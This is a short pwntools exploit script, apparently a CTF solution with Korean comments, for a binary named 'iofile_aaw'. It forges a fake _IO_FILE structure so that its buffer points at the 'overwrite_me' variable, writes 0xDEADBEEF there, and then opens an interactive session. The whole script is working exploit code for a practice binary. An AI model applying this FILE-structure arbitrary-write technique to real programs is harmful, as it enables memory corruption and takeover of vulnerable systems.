from pwn import *

context.binary = elf = ELF("./iofile_aaw")
context.arch = "amd64"
context.log_level = "info"

var = elf.sym["overwrite_me"]

p = process()

pay = p64(0xfbad2488) # read flag(_flags)(p32, 4byte), 근데 정렬로 뒤 더미 4바이트 붙어서 p64. 플래그는 원래 쓰던 거 유지함
pay += p64(0) # io read ptr
pay += p64(0) # io read end
pay += p64(0) # ip read base
pay += p64(0) # io write base
pay += p64(0) # io write ptr
pay += p64(0) # io write end
pay += p64(var) # io buf base
pay += p64(var+1024) # io buf end
pay += p64(0) # io save base
pay += p64(0) # io backup base
pay += p64(0) # io save end
pay += p64(0) # io marker markers
pay += p64(0) # io file chain
pay += p64(0) # fileno(stdin, stdout, ...)(p32로 묶어야 하지만, 뒤 4바이트도 딱히 필요 없어서 0으로 합침)

p.sendlineafter(b'Data: ', pay)
time.sleep(1)
p.send(p64(0xDEADBEEF).ljust(1024, b'\x00'))

p.interactive()